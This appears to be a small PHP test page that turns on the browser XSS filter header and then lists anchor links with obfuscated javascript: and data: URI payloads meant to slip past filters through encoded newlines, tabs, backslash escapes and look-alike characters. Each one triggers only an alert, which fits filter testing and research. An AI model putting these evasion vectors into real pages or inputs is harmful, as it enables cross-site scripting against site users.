<?php
header('X-XSS-Protection: 1')
?>

<html>
<head>

<head>
<body>
<a href="java%0ascript:alert(1)">xss</a>
  <a href="">xss</a>
   <a href="java%09script:alert(1)">xss</a>
   <a href="java%0dscript:alert(1)">xss</a>
   <a href="\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)">xss</a>
   <a href="java%41script:alert(1)">xss</a>
   <a href="data%3Atext/html,<script>alert(0)</script>">xss</a>
 <a href="javaſcrip:alert()">aſc</a>
   <a href="">xss</a>
   <a href="">xss</a>
   <a href="">xss</a>
   <a href="">xss</a>
   <a href="">xss</a>
  

<body>
</html>
